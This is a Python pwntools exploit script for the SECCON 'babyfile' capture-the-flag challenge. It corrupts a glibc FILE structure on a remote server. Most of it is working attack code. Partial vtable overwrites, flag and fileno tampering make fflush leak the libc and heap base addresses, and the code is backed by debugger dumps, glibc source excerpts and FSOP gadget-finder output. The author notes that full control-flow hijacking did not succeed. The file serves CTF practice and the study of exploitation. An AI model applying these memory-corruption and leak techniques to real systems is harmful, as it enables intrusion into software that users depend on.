#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=babyfile.seccon.games' '--port=3157' ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'babyfile.seccon.games'
port = int(args.PORT or 3157)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        if args.API:
            kw['api'] = True
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue

# Helpful for debugging
break _exit

# Break after fopen
breakrva 0x1268
continue

# set useful variables
set $ff=(struct _IO_FILE_plus*)$rax
set $f=(FILE*)$rax
set $vt=((struct _IO_FILE_plus*)$rax)->vtable

# And aliases to dereference them
alias ff=p *$f
alias fff=p *$ff
alias vt=p *$vt

# Used for stage3 of exploit
break fflush
ignore 2
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


def flush():
    io.recvuntil(b'> ')
    io.sendline(b'1')

def write(offset, data):
    assert isinstance(data, bytes)
    for ch in data:
        #assert (0 <= offset <= 127) or (192 <= offset <= 255)
        io.recvuntil(b'> ')
        io.sendline(b'2')
        if args.FASTER:
            io.sendline(b'%d' % offset)
            io.sendline(b'%d' % ch)
        else:
            io.sendlineafter(b'offset: ', b'%d' % offset)
            io.sendlineafter(b'value: ', b'%d' % ch)
        offset += 1
        if not args.FASTER:
            io.recvuntil(b'Done.')

def exit():
    io.recvuntil(b'> ')
    io.sendline(b'0')

"""
pwndbg> ptype /o FILE
type = struct _IO_FILE {
/*      0      |       4 */    int _flags;
/* XXX  4-byte hole      */
/*      8      |       8 */    char *_IO_read_ptr;
/*     16      |       8 */    char *_IO_read_end;
/*     24      |       8 */    char *_IO_read_base;
/*     32      |       8 */    char *_IO_write_base;
/*     40      |       8 */    char *_IO_write_ptr;
/*     48      |       8 */    char *_IO_write_end;
/*     56      |       8 */    char *_IO_buf_base;
/*     64      |       8 */    char *_IO_buf_end;
/*     72      |       8 */    char *_IO_save_base;
/*     80      |       8 */    char *_IO_backup_base;
/*     88      |       8 */    char *_IO_save_end;
/*     96      |       8 */    struct _IO_marker *_markers;
/*    104      |       8 */    struct _IO_FILE *_chain;
/*    112      |       4 */    int _fileno;
/*    116      |       4 */    int _flags2;
/*    120      |       8 */    __off_t _old_offset;
/*    128      |       2 */    unsigned short _cur_column;
/*    130      |       1 */    signed char _vtable_offset;
/*    131      |       1 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/*    136      |       8 */    _IO_lock_t *_lock;
/*    144      |       8 */    __off64_t _offset;
/*    152      |       8 */    struct _IO_codecvt *_codecvt;
/*    160      |       8 */    struct _IO_wide_data *_wide_data;
/*    168      |       8 */    struct _IO_FILE *_freeres_list;
/*    176      |       8 */    void *_freeres_buf;
/*    184      |       8 */    size_t __pad5;
/*    192      |       4 */    int _mode;
/*    196      |      20 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             }

pwndbg> ptype /o struct _IO_FILE_plus
/* offset      |    size */  type = struct _IO_FILE_plus {
/*      0      |     216 */    FILE file;
/*    216      |       8 */    const struct _IO_jump_t *vtable;

                               /* total size (bytes):  224 */
                             }

The `fp` pointer points to _IO_FILE_plus in practice.
"""

# file pointer vtable:
"""
pwndbg> telescope 0x7ffff7f984a0 40
00:0000│  0x7ffff7f984a0 (_IO_file_jumps) ◂— 0x0
01:0008│  0x7ffff7f984a8 (_IO_file_jumps+8) ◂— 0x0
02:0010│  0x7ffff7f984b0 (_IO_file_jumps+16) —▸ 0x7ffff7e3ef50 (_IO_file_finish) ◂— endbr64
03:0018│  0x7ffff7f984b8 (_IO_file_jumps+24) —▸ 0x7ffff7e3fd80 (_IO_file_overflow) ◂— endbr64
04:0020│  0x7ffff7f984c0 (_IO_file_jumps+32) —▸ 0x7ffff7e3fa20 (_IO_file_underflow) ◂— endbr64
05:0028│  0x7ffff7f984c8 (_IO_file_jumps+40) —▸ 0x7ffff7e40f50 (_IO_default_uflow) ◂— endbr64
06:0030│  0x7ffff7f984d0 (_IO_file_jumps+48) —▸ 0x7ffff7e42680 (_IO_default_pbackfail) ◂— endbr64
07:0038│  0x7ffff7f984d8 (_IO_file_jumps+56) —▸ 0x7ffff7e3e5d0 (_IO_file_xsputn) ◂— endbr64
08:0040│  0x7ffff7f984e0 (_IO_file_jumps+64) —▸ 0x7ffff7e3e240 (__GI__IO_file_xsgetn) ◂— endbr64
09:0048│  0x7ffff7f984e8 (_IO_file_jumps+72) —▸ 0x7ffff7e3d860 (_IO_file_seekoff) ◂— endbr64
0a:0050│  0x7ffff7f984f0 (_IO_file_jumps+80) —▸ 0x7ffff7e41600 (_IO_default_seekpos) ◂— endbr64
0b:0058│  0x7ffff7f984f8 (_IO_file_jumps+88) —▸ 0x7ffff7e3d530 (_IO_file_setbuf) ◂— endbr64
0c:0060│  0x7ffff7f98500 (_IO_file_jumps+96) —▸ 0x7ffff7e3d3c0 (_IO_file_sync) ◂— endbr64
0d:0068│  0x7ffff7f98508 (_IO_file_jumps+104) —▸ 0x7ffff7e30c70 (_IO_file_doallocate) ◂— endbr64
0e:0070│  0x7ffff7f98510 (_IO_file_jumps+112) —▸ 0x7ffff7e3e5a0 (_IO_file_read) ◂— endbr64
0f:0078│  0x7ffff7f98518 (_IO_file_jumps+120) —▸ 0x7ffff7e3de60 (_IO_file_write) ◂— endbr64
10:0080│  0x7ffff7f98520 (_IO_file_jumps+128) —▸ 0x7ffff7e3d600 (_IO_file_seek) ◂— endbr64
11:0088│  0x7ffff7f98528 (_IO_file_jumps+136) —▸ 0x7ffff7e3d520 (_IO_file_close) ◂— endbr64
12:0090│  0x7ffff7f98530 (_IO_file_jumps+144) —▸ 0x7ffff7e3de40 (_IO_file_stat) ◂— endbr64
13:0098│  0x7ffff7f98538 (_IO_file_jumps+152) —▸ 0x7ffff7e42810 (_IO_default_showmanyc) ◂— endbr64
14:00a0│  0x7ffff7f98540 (_IO_file_jumps+160) —▸ 0x7ffff7e42820 (_IO_default_imbue) ◂— endbr64
15:00a8│  0x7ffff7f98548 ◂— 0x0
... ↓     4 skipped
1a:00d0│  0x7ffff7f98570 (_IO_str_jumps+16) —▸ 0x7ffff7e42d50 (_IO_str_finish) ◂— endbr64
1b:00d8│  0x7ffff7f98578 (_IO_str_jumps+24) —▸ 0x7ffff7e429b0 (_IO_str_overflow) ◂— endbr64
1c:00e0│  0x7ffff7f98580 (_IO_str_jumps+32) —▸ 0x7ffff7e42950 (_IO_str_underflow) ◂— endbr64
1d:00e8│  0x7ffff7f98588 (_IO_str_jumps+40) —▸ 0x7ffff7e40f50 (_IO_default_uflow) ◂— endbr64
1e:00f0│  0x7ffff7f98590 (_IO_str_jumps+48) —▸ 0x7ffff7e42d30 (_IO_str_pbackfail) ◂— endbr64
1f:00f8│  0x7ffff7f98598 (_IO_str_jumps+56) —▸ 0x7ffff7e40fb0 (_IO_default_xsputn) ◂— endbr64
20:0100│  0x7ffff7f985a0 (_IO_str_jumps+64) —▸ 0x7ffff7e411c0 (_IO_default_xsgetn) ◂— endbr64
21:0108│  0x7ffff7f985a8 (_IO_str_jumps+72) —▸ 0x7ffff7e42eb0 (_IO_str_seekoff) ◂— endbr64
22:0110│  0x7ffff7f985b0 (_IO_str_jumps+80) —▸ 0x7ffff7e41600 (_IO_default_seekpos) ◂— endbr64
23:0118│  0x7ffff7f985b8 (_IO_str_jumps+88) —▸ 0x7ffff7e414e0 (_IO_default_setbuf) ◂— endbr64
24:0120│  0x7ffff7f985c0 (_IO_str_jumps+96) —▸ 0x7ffff7e41870 (_IO_default_sync) ◂— endbr64
25:0128│  0x7ffff7f985c8 (_IO_str_jumps+104) —▸ 0x7ffff7e41670 (_IO_default_doallocate) ◂— endbr64
26:0130│  0x7ffff7f985d0 (_IO_str_jumps+112) —▸ 0x7ffff7e427f0 (_IO_default_read) ◂— endbr64
27:0138│  0x7ffff7f985d8 (_IO_str_jumps+120) —▸ 0x7ffff7e42800 (_IO_default_write) ◂— endbr64


NOTE: In theory, we can also overwrite the vtable last byte to point ot some _IO_file_jumps_mmap calls:
pwndbg> telescope 0x7ffff7f98400 40
00:0000│  0x7ffff7f98400 (_IO_file_jumps_mmap+32) —▸ 0x7ffff7e3eae0 (_IO_file_underflow_mmap) ◂— endbr64
01:0008│  0x7ffff7f98408 (_IO_file_jumps_mmap+40) —▸ 0x7ffff7e40f50 (_IO_default_uflow) ◂— endbr64
02:0010│  0x7ffff7f98410 (_IO_file_jumps_mmap+48) —▸ 0x7ffff7e42680 (_IO_default_pbackfail) ◂— endbr64
03:0018│  0x7ffff7f98418 (_IO_file_jumps_mmap+56) —▸ 0x7ffff7e3e5d0 (_IO_file_xsputn) ◂— endbr64
04:0020│  0x7ffff7f98420 (_IO_file_jumps_mmap+64) —▸ 0x7ffff7e3df00 (_IO_file_xsgetn_mmap) ◂— endbr64
05:0028│  0x7ffff7f98428 (_IO_file_jumps_mmap+72) —▸ 0x7ffff7e3e470 (_IO_file_seekoff_mmap) ◂— endbr64
06:0030│  0x7ffff7f98430 (_IO_file_jumps_mmap+80) —▸ 0x7ffff7e41600 (_IO_default_seekpos) ◂— endbr64
07:0038│  0x7ffff7f98438 (_IO_file_jumps_mmap+88) —▸ 0x7ffff7e3d560 (_IO_file_setbuf_mmap) ◂— endbr64
08:0040│  0x7ffff7f98440 (_IO_file_jumps_mmap+96) —▸ 0x7ffff7e3d610 (_IO_file_sync_mmap) ◂— endbr64
09:0048│  0x7ffff7f98448 (_IO_file_jumps_mmap+104) —▸ 0x7ffff7e30c70 (_IO_file_doallocate) ◂— endbr64
0a:0050│  0x7ffff7f98450 (_IO_file_jumps_mmap+112) —▸ 0x7ffff7e3e5a0 (_IO_file_read) ◂— endbr64
0b:0058│  0x7ffff7f98458 (_IO_file_jumps_mmap+120) —▸ 0x7ffff7e3de60 (_IO_file_write) ◂— endbr64
0c:0060│  0x7ffff7f98460 (_IO_file_jumps_mmap+128) —▸ 0x7ffff7e3d600 (_IO_file_seek) ◂— endbr64
0d:0068│  0x7ffff7f98468 (_IO_file_jumps_mmap+136) —▸ 0x7ffff7e3d5d0 (_IO_file_close_mmap) ◂— endbr64
0e:0070│  0x7ffff7f98470 (_IO_file_jumps_mmap+144) —▸ 0x7ffff7e3de40 (_IO_file_stat) ◂— endbr64
0f:0078│  0x7ffff7f98478 (_IO_file_jumps_mmap+152) —▸ 0x7ffff7e42810 (_IO_default_showmanyc) ◂— endbr64
10:0080│  0x7ffff7f98480 (_IO_file_jumps_mmap+160) —▸ 0x7ffff7e42820 (_IO_default_imbue) ◂— endbr64
11:0088│  0x7ffff7f98488 ◂— 0x0
... ↓     4 skipped
16:00b0│  0x7ffff7f984b0 (_IO_file_jumps+16) —▸ 0x7ffff7e3ef50 (_IO_file_finish) ◂— endbr64
"""

# Overwrite last byte of vtable
# Normally, the vtable points to:
#   vtable = 0x7ffff7f984a0 <_IO_file_jumps>
# It is on constant offset from libc base:
#   File (Base) 0x7ffff7f984a0 = 0x7ffff7daf000 + 0x1e94a0

"""
Overwriting last vtable byte with = 0x88
    _IO_buf_base = 0x559db2bd7480 "",
    _IO_buf_end = 0x559db2bd847f "",

Overwriting last vtable byte with = 0xa8
168 $1 = {
  file = {
    _flags = -72539000,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x563fafe10480 "",
    _IO_buf_end = 0x563fafe12480 "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7f3b2ea065c0 <_IO_2_1_stderr_>,
    _fileno = 3,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x563fafe10380,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7f3b2ea024a8 <_IO_file_jumps+8>

"""

# This piece below could be used to find out the vtable offsets that set some _IO_buf_* pointers
#for byte in range(0xa8+8, 0xff, 8):
#    with start(timeout=2) as io:
#        if args.API:
#            io.gdb.execute('continue')
#        print("Overwriting last vtable byte with = %#x" % byte)
#        write(216, p8(byte))
#
#        flush()
#
#        try:
#            exit()
#        except EOFError:
#            print("CRASHED")
#            continue
#
#        must_change = """
#    _IO_read_ptr = 0x0,
#    _IO_read_end = 0x0,
#    _IO_read_base = 0x0,
#    _IO_write_base = 0x0,
#    _IO_write_ptr = 0x0,
#    _IO_write_end = 0x0,
#    _IO_buf_base = 0x0,
#    _IO_buf_end = 0x0,
#    _IO_save_base = 0x0,
#    _IO_backup_base = 0x0,
#    _IO_save_end = 0x0,
#    _markers = 0x0,"""
#
#        if args.API:
#            x = io.gdb.execute('fff', to_string=True)
#            assert isinstance(x, str)
#            print(byte, x)
#
#            if must_change in x:
#                io.gdb.quit()  # exit gdb
#                continue
#            else:
#                print("CHANGED!!!")
#                asdf


# Here, we brute if we can set some other ptrs based on the already set ones
#for byte in range(0x00, 0xff, 8):
#    with start(timeout=2) as io:
#        if args.API:
#            io.gdb.execute('continue')
#        print("Overwriting last vtable byte with = %#x to set fp.file->_IO_buf_base/end" % 0x88)
#        #_IO_buf_base = 0x559db2bd7480 "",
#        #_IO_buf_end = 0x559db2bd847f "",
#        write(216, p8(0x88))
#        flush()
#
#        print("Overwriting last vtable byte with = %#x" % byte)
#        write(216, p8(byte))
#        flush()
#
#        try:
#            exit()
#        except EOFError:
#            print("CRASHED")
#            continue
#
#        must_change = """
#    _IO_read_ptr = 0x0,
#    _IO_read_end = 0x0,
#    _IO_read_base = 0x0,
#    _IO_write_base = 0x0,
#    _IO_write_ptr = 0x0,
#    _IO_write_end = 0x0,"""
#        must_change2 = """
#    _IO_save_base = 0x0,
#    _IO_backup_base = 0x0,
#    _IO_save_end = 0x0,
#    _markers = 0x0,"""
#
#        if args.API:
#            x = io.gdb.execute('fff', to_string=True)
#            assert isinstance(x, str)
#            print(byte, x)
#
#            if must_change in x and must_change2 in x:
#                io.gdb.quit()  # exit gdb
#                continue
#            else:
#                print("CHANGED!!!")
#                asdf

"""
Overwriting last vtable byte with = 0x88 to set fp.file->_IO_buf_base/end
Overwriting last vtable byte with = 0x60
96 $1 = {
  file = {
    _flags = -72538712,
    _IO_read_ptr = 0x558ffb8c250f "\200",
    _IO_read_end = 0x558ffb8c2590 "",
    _IO_read_base = 0x558ffb8c2490 "",
    _IO_write_base = 0x558ffb8c1480 "",
    _IO_write_ptr = 0x558ffb8c1480 "",
    _IO_write_end = 0x558ffb8c1480 "",
    _IO_buf_base = 0x558ffb8c1480 "",
    _IO_buf_end = 0x558ffb8c247f "",
    _IO_save_base = 0x558ffb8c1480 "",
    _IO_backup_base = 0x558ffb8c2510 "",
    _IO_save_end = 0x558ffb8c1480 "",
    _markers = 0x0,
    _chain = 0x7f2ee10df5c0 <_IO_2_1_stderr_>,
    _fileno = 3,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x558ffb8c1380,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7f2ee10db460 <_IO_file_jumps_mmap+128>
}
"""
with start() as io:
    if args.API:
        io.gdb.execute('continue')
    print("Overwriting last vtable byte with = %#x to set fp.file->_IO_buf_base/end" % 0x88)
    #_IO_buf_base = 0x559db2bd7480 "",
    #_IO_buf_end = 0x559db2bd847f "",

    pause()
    write(216, p8(0x88))
    flush()
    pause()

    print("Overwriting last vtable byte with = %#x, to set all _IO_{read,write,buf,*} ptrs" % 0x60)
    write(216, p8(0x60))
    flush()

    print("Fixing vtable to its correct value")
    write(216, p8(0xa0))

    """
    fflush calls _IO_new_file_sync which has this logic:

       797   /*    char* ptr = cur_ptr(); */
     ► 798   if (fp->_IO_write_ptr > fp->_IO_write_base)
       799     if (_IO_do_flush(fp)) return EOF;

    And our values are:

        pwndbg> p fp
        $2 = (FILE *) 0x55efb23f92a0
        pwndbg> p fp->_IO_write_ptr
        $3 = 0x55efb23f9480 ""
        pwndbg> p fp->_IO_write_base
        $4 = 0x55efb23f9480 ""

    Write ptr offset:
    /*     40      |       8 */    char *_IO_write_ptr;
    """
    write(40, p8(0xff))

    """
    Actually, the _IO_do_flush in code calls _IO_do_write:
     ► 0x7f2c716c4473 <_IO_file_sync+179>    call   _IO_do_write                <_IO_do_write>
        rdi: 0x55efb23f92a0 ◂— 0xfbad25a8
        rsi: 0x55efb23f9480 ◂— 0x0
        rdx: 0x7f
        rcx: 0x0

   422 int
   423 _IO_new_do_write (FILE *fp, const char *data, size_t to_do)
 ► 424 {
   425   return (to_do == 0
   426 	  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
   427 }
   428 libc_hidden_ver (_IO_new_do_write, _IO_do_write)

 430 static size_t
 431 new_do_write (FILE *fp, const char *data, size_t to_do)
 432 {
 433   size_t count;
 434   if (fp->_flags & _IO_IS_APPENDING)
 435     /* On a system without a proper O_APPEND implementation,
 436        you would need to sys_seek(0, SEEK_END) here, but is
 437        not needed nor desirable for Unix- or Posix-like systems.
 438        Instead, just indicate that offset (before and after) is
 439        unpredictable. */
 440     fp->_offset = _IO_pos_BAD;
 441   else if (fp->_IO_read_end != fp->_IO_write_base)
 442     {
 443       off64_t new_pos
 444     = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
 445       if (new_pos == _IO_pos_BAD)
 446     return 0;
 447       fp->_offset = new_pos;
 448     }
 449   count = _IO_SYSWRITE (fp, data, to_do);
 450   if (fp->_cur_column && count)
 451     fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
 452   _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
 453   fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
 454   fp->_IO_write_end = (fp->_mode <= 0
 455                && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
 456                ? fp->_IO_buf_base : fp->_IO_buf_end);
 457   return count;
 458 }
    """
 
    # Lets make this skip because it calls lseek on fp->fileno:
    # 441   else if (fp->_IO_read_end != fp->_IO_write_base)
    # /*     32      |       8 */    char *_IO_write_base;
    # /*     16      |       8 */    char *_IO_read_end;
    #
    # overwrite two bytes so they match :)
    #write(16, p16(0x9000))
    #write(32, p16(0x9000))

    # ^--- actually that turned out to be not so great
    # So we decided to go into if (... flags & IO_IS_APPENDING)
    # to not call sysseek :)
    #  434   if (fp->_flags & _IO_IS_APPENDING)
    #   libio.h
    #   81:#define _IO_IS_APPENDING      0x1000
    
    # Our flags are: 0xfbad25a8
    flags = 0xfbad25a8 | 0x1000
    write(0, p32(flags))
    
    # Now calling fflush will call:
    """
     ► f 0   0x7ffff7ebd060 write
   f 1   0x7ffff7e3de8d _IO_file_write+45
   f 2   0x7ffff7e3f951 _IO_do_write+177
   f 3   0x7ffff7e3f951 _IO_do_write+177
   f 4   0x7ffff7e3f951 _IO_do_write+177
   f 5   0x7ffff7e3d478 _IO_file_sync+184
   f 6   0x7ffff7e313c6 fflush+134
   f 7   0x5555555552ca main+161

   pwndbg> dumpargs -f
     rdi = 0x1
     rsi = 0x555555559480 ◂— 0x0
     rdx = 0x7f
    """
    # Now lets also set 
    # /*     32      |       8 */    char *_IO_write_base;
    write(32, p8(0x70)) # <-- 0x70 is vtable offset ptr

    """
    1172 ssize_t
    1173 _IO_new_file_write (FILE *f, const void *data, ssize_t n)
    1174 {
    1175   ssize_t to_do = n;
    1176   while (to_do > 0)
    1177     {
    1178       ssize_t count = (__builtin_expect (f->_flags2
    1179                                          & _IO_FLAGS2_NOTCANCEL, 0)
    1180                ? __write_nocancel (f->_fileno, data, to_do)
    1181                : __write (f->_fileno, data, to_do));
    1182       if (count < 0)
    1183     {
    1184       f->_flags |= _IO_ERR_SEEN;
    1185       break;
    1186     }
    1187       to_do -= count;
    1188       data = (void *) ((char *) data + count);
    1189     }
    1190   n -= to_do;
    1191   if (f->_offset >= 0)
    1192     f->_offset += n;
    1193   return n;
    1194 }
    """

    # Actually the program calls now:
    # ► 0x7f0e50c0ae88 <_IO_file_write+40>    call   write                <write>
    #    fd: 0x3 (/dev/null)
    #    buf: 0x563e0cda0000
    #    n: 0xd4ff

    # So lets overwrite fileno:
    # /*    112      |       4 */    int _fileno;
    write(112, p8(0x1)) # set fp->_fileno = STDOUT_FILENO

    # 
    # For some reason this does not work...
    # Handled it in gdbscript with:
    #   break fflush
    #   ignore 3 4
    #if args.API:
    #    io.gdb.execute('interrupt')
    #    io.gdb.wait()
    #    io.gdb.execute('break fflush')
    #    io.gdb.execute('continue')
    flush()

    if args.API:
        io.gdb.execute('d')
        #io.gdb.execute('break _IO_file_underflow')
        #io.gdb.execute('break _IO_file_read')
        #io.gdb.execute('break _IO_file_xsgetn')
        #io.gdb.execute('break _IO_default_pbackfail')
        #io.gdb.execute('break save_for_backup')
        io.gdb.execute('break _IO_new_file_underflow')
        io.gdb.execute('continue')

    data = io.recvuntil(b'0. Exit')

    # VTABLE PTR: 0x7ffff7f97f60
    #          File (Base) 0x7ffff7f97f60 = 0x7ffff7daf000 + 0x1e8f60
    vtable_ptr = u64(data[0:8])
    libc_base = vtable_ptr - 0x1e8f60
    print("VTABLE PTR: %#x" % vtable_ptr)
    print("LIBC BASE : %#x" % libc_base)

    # Now lets leak some heap address
    #/*     32      |       8 */    char *_IO_write_base;
    #/*     40      |       8 */    char *_IO_write_ptr;
    #/*     48      |       8 */    char *_IO_write_end;
    libc_leak_addr = libc_base + 0x1ec2c8 # <--- this points to place where glibc stores heap_base address
    write(32, p64(libc_leak_addr))
    write(40, p64(libc_leak_addr+8))
    #write(48, p64(libc_leak_addr + 100))
    flush()

    heap_base = u64(io.recvuntil(b'Done.', drop=True))
    heap_file_addr = heap_base + 0x2a0
    print("HEAP BASE: %#x" % heap_base)
    print("FILE ADDR: %#x" % heap_file_addr)

    # Now, we use binary ninja + https://github.com/xf1les/fsop-finder
    # To get fsop gadgets
    """
    FSOP gadgets generated:
    [*] Generating call chain...
 0. __GI__IO_wfile_underflow@0x888e0 -> __libio_codecvt_in@0x8a620
    0x88dd4: call(0x8a620)
      RIP/RDI DATAFLOW:
       r14 = [rdi + 0x98].q -> rdi = r14 -> call(0x8a620)
      RBP DATAFLOW:
       (N/A)
      CODE PATH:
       eax = [rdi].d
        => [condition] (al & 0x10) == 0
        => [condition] (al & 4) == 0
       rax = [rdi + 0xa0].q
       rdx = [rax].q
        => [condition] rdx u>= [rax + 8].q
       rdx = [rdi + 8].q
       rcx = [rdi + 0x10].q
        => [condition] rdx u< rcx
    0x8a6a5: call(rbp)
      RIP/RDI DATAFLOW:
       r13 = [rdi].q -> rbp = [r13 + 0x28].q -> call(rbp)
      RBP DATAFLOW:
       r13 = [rdi].q -> rbp = [r13 + 0x28].q
      CODE PATH:
       r13 = [rdi].q
       cond:0 = [r13].q == 0
        => [condition] cond:0
 1. __GI__IO_wfile_underflow@0x888e0 -> __GI__IO_wdoallocbuf@0x87490
    0x88eaf: call(0x87490)
      RIP/RDI DATAFLOW:
       rbx = rdi -> rdi = rbx -> call(0x87490)
      RBP DATAFLOW:
       (N/A)
      CODE PATH:
       eax = [rdi].d
        => [condition] (al & 0x10) == 0
       rbx = rdi
        => [condition] (al & 4) == 0
       rax = [rdi + 0xa0].q
       rdx = [rax].q
        => [condition] rdx u>= [rax + 8].q
       rdx = [rdi + 8].q
       rcx = [rdi + 0x10].q
        => [condition] rdx u>= rcx
        => [condition] rax != 0
       rax = [rbx + 0xa0].q
       cond:0 = [rax + 0x30].q == 0
        => [condition] cond:0
       rdi = [rax + 0x40].q
        => [condition] rdi == 0
    0x874bb: call([rax + 0x68].q)
      RIP/RDI DATAFLOW:
       rax = [rdi + 0xa0].q -> rax = [rax + 0xe0].q -> call([rax + 0x68].q)
      RBP DATAFLOW:
       (N/A)
      CODE PATH:
       rax = [rdi + 0xa0].q
        => [condition] [rax + 0x30].q == 0
        => [condition] ([rdi].b & 2) == 0
  ([0x1e8f80] is the location of __GI__IO_wfile_underflow in __libc_IO_vtables)
 2. _IO_wfile_underflow_mmap@0x89980 -> __libio_codecvt_in@0x8a620
    0x89a08: call(0x8a620)
      RIP/RDI DATAFLOW:
       rbp = [rdi + 0x98].q -> rdi = rbp -> call(0x8a620)
      RBP DATAFLOW:
       rbp = [rdi + 0x98].q
      CODE PATH:
       eax = [rdi].d
        => [condition] (al & 4) == 0
       rax = [rdi + 0xa0].q
       rdx = [rax].q
        => [condition] rdx u>= [rax + 8].q
       rdx = [rdi + 8].q
        => [condition] rdx u< [rdi + 0x10].q
    0x8a6a5: call(rbp)
      RIP/RDI DATAFLOW:
       r13 = [rdi].q -> rbp = [r13 + 0x28].q -> call(rbp)
      RBP DATAFLOW:
       r13 = [rdi].q -> rbp = [r13 + 0x28].q
      CODE PATH:
       r13 = [rdi].q
       cond:0 = [r13].q == 0
        => [condition] cond:0
 3. _IO_wfile_underflow_mmap@0x89980 -> __GI__IO_wdoallocbuf@0x87490
    0x89a9d: call(0x87490)
      RIP/RDI DATAFLOW:
       rbx = rdi -> rdi = rbx -> call(0x87490)
      RBP DATAFLOW:
       rbp = [rdi + 0x98].q
      CODE PATH:
       eax = [rdi].d
        => [condition] (al & 4) == 0
       rax = [rdi + 0xa0].q
       rdx = [rax].q
        => [condition] rdx u>= [rax + 8].q
       rdx = [rdi + 8].q
        => [condition] rdx u< [rdi + 0x10].q
       rdi = [rax + 0x40].q
        => [condition] rdi == 0
    0x874bb: call([rax + 0x68].q)
      RIP/RDI DATAFLOW:
       rax = [rdi + 0xa0].q -> rax = [rax + 0xe0].q -> call([rax + 0x68].q)
      RBP DATAFLOW:
       (N/A)
      CODE PATH:
       rax = [rdi + 0xa0].q
        => [condition] [rax + 0x30].q == 0
        => [condition] ([rdi].b & 2) == 0
  ([0x1e8ec0] is the location of _IO_wfile_underflow_mmap in __libc_IO_vtables)
 4. __GI__IO_wfile_overflow@0x89ce0 -> __GI__IO_wdoallocbuf@0x87490
    0x89f20: call(0x87490)
      RIP/RDI DATAFLOW:
       call(0x87490)
      RBP DATAFLOW:
       rbp = rdi
      CODE PATH:
       eax = [rdi].d
        => [condition] (al & 8) == 0
        => [condition] (ah & 8) == 0
       rdx = [rdi + 0xa0].q
        => [condition] [rdx + 0x18].q == 0
    0x874bb: call([rax + 0x68].q)
      RIP/RDI DATAFLOW:
       rax = [rdi + 0xa0].q -> rax = [rax + 0xe0].q -> call([rax + 0x68].q)
      RBP DATAFLOW:
       (N/A)
      CODE PATH:
       rax = [rdi + 0xa0].q
        => [condition] [rax + 0x30].q == 0
        => [condition] ([rdi].b & 2) == 0
  ([0x1e8df8, 0x1e8eb8, 0x1e8f78] is the location of __GI__IO_wfile_overflow in __libc_IO_vtables)
 5. __GI__IO_wdefault_xsgetn@0x87950 -> __GI__IO_switch_to_wget_mode@0x875d0
    0x87ade: call(0x875d0)
      RIP/RDI DATAFLOW:
       r15 = rdi -> rdi = r15 -> call(0x875d0)
      RBP DATAFLOW:
       (N/A)
      CODE PATH:
       r15 = rdi
       rdx = [r15 + 0xa0].q
       rsi = [rdx].q
       rax = [rdx + 8].q
       rax = rax - rsi
        => [condition] rax s<= 0
        => [condition] rbx != 0
       edx = [r15 + 0xc0].d
       temp0.d = edx
       cond:0 = temp0.d == 0
        => [condition] temp0.d s>= 0
        => [condition] not(cond:0)
    0x875f5: call([rax + 0x18].q)
      RIP/RDI DATAFLOW:
       rax = [rdi + 0xa0].q -> rax = [rax + 0xe0].q -> call([rax + 0x18].q)
      RBP DATAFLOW:
       (N/A)
      CODE PATH:
       rax = [rdi + 0xa0].q
       rdx = [rax + 0x20].q
        => [condition] rdx u> [rax + 0x18].q
  ([0x1e89a0, 0x1e8ca0, 0x1e8d60, 0x1e9060] is the location of __GI__IO_wdefault_xsgetn in __libc_IO_vtables)
[*] Done. 6 exploitable call chain(s) found.
    """

    # Overwrite wdata
    # First gadget:
    # 00:0000│  0x7ffff7f97f80 (_IO_wfile_jumps+32) —▸ 0x7ffff7e378e0 (_IO_wfile_underflow) ◂— endbr64 

    # set fp.vtable = _IO_wfile_underflow-0x60
    #  File (Base) 0x7ffff7f97f20 = 0x7ffff7daf000 + 0x1e8f20
    #new_vtable = libc_base + 0x1e8f20
    #write(216, p64(new_vtable))
    #flush()

    # ^--- IT TURNED OUT HERE THAT FSROP CANT BE DONE BECAUSE WE CANT OVERWRITE
    # THE wide_data or codecvt fields that are required for FSOP gadgets

